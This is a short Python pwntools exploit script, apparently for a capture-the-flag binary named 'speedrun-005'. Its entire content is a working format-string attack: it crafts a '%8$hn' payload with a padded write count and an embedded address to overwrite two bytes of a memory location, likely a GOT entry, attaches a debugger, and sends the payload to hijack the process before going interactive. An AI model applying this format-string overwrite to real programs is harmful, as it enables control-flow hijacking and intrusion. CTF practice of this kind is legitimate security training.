#!/usr/bin/python
from pwn import *

context.terminal = ['tmux', 'split', '-h']

p = process("./speedrun-005")

payload = ''
payload += '%' + str(0x5858) + 'd'
payload += '%8$hn'
payload += '\x00\x00\x00\x00\x18\x10\x60\x00\x00\x00\x00\x00'

gdb.attach(p)
raw_input()

p.sendlineafter("time? ", payload)

p.interactive()